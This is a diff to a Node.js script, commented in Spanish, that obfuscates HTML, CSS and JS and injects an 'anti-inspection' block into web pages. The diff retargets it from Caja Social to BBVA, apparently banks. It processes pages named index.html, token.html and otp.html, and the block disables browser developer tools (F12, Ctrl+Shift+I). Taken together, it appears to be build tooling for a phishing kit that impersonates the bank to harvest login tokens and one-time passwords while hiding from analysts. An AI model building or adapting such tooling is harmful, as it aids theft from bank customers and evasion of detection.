@@ -1,5 +1,5 @@
 /* ============================================
-   OFUSCAR CAJA SOCIAL + ANTI-INSPECCIÓN
+   OFUSCAR BBVA + ANTI-INSPECCIÓN
    Ofusca HTML + CSS + JS y agrega anti-inspección
    ============================================ */
 
@@ -12,7 +12,7 @@ const CleanCSS = require('clean-css');
 // ============================================
 // CONFIGURACIÓN
 // ============================================
-const CARPETA = path.join(__dirname, 'caja-social-build');
+const CARPETA = path.join(__dirname, 'bbva-build');
 
 // Configuración del ofuscador JS
 const CONFIG_JS = {
@@ -108,7 +108,8 @@ async function minificarHTML(archivo) {
         let codigo = fs.readFileSync(ruta, 'utf8');
 
         // 1. Insertar anti-inspección antes de </body> si no existe
-        if (codigo.indexOf('_0xa1=0') === -1) {
+        // BBVA ya usa _0x22 / contextmenu — checamos ambos
+        if (codigo.indexOf('_0xa1=0') === -1 && codigo.indexOf('_0xeia') === -1) {
             if (codigo.indexOf('</body>') !== -1) {
                 codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
             } else {
@@ -155,12 +156,11 @@ function minificarCSS(archivo) {
 // EJECUTAR
 // ============================================
 async function main() {
-    console.log('\n🔒 OFUSCANDO CAJA SOCIAL + ANTI-INSPECCIÓN\n');
+    console.log('\n🔒 OFUSCANDO BBVA + ANTI-INSPECCIÓN\n');
 
     // Minificar HTML + insertar anti-inspección
     console.log('📄 Minificando HTML + agregando anti-inspección:');
     await minificarHTML('index.html');
-    await minificarHTML('password.html');
     await minificarHTML('token.html');
     await minificarHTML('otp.html');
 
@@ -168,7 +168,7 @@ async function main() {
     console.log('\n📄 Minificando CSS:');
     minificarCSS('styles.css');
 
-    console.log('\n✅ CAJA SOCIAL OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
+    console.log('\n✅ BBVA OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
     console.log('🔒 Anti-inspección activado:');
     console.log('   ❌ F12 bloqueado');
     console.log('   ❌ Ctrl+Shift+I bloqueado');
